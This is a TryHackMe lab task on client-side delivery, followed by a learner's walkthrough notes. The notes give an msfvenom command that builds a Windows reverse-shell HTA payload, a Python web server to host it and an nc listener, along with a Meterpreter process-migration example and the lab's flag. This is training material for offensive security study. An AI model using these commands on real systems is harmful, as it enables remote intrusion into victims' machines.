We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/.

Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d92b185b39570d4740e6f6a8e905124a.png)  

The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.

**Note for Doc files**: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. 

In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,

Terminal

```shell-session
meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960
```

In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.

For reference, you can use the MSFVenom Cheat Sheet on this [website](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).

Answer the questions below

What is the flag? **Hint**: Check the user desktop folder for the flag!

	THM{b4dbc2f16afdfe9579030a929b799719}
	
![[Pasted image 20220326073853.png]]

Create Paylod
```shell
~/tools/metasploit-framework/msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.1.55 LPORT=9001 -f hta-psh -o thm.hta
```

Start Web Server
```shell
python3 -m http.server
```

Start Listener
```shell
nc -lvnp 9001
```

Visit link!
http://10.13.1.55:8000/thm.hta

![[Pasted image 20220326083713.png]]

![[Pasted image 20220326083824.png]]

Change to desktop for thm user and get flag.
![[Pasted image 20220326083950.png]]
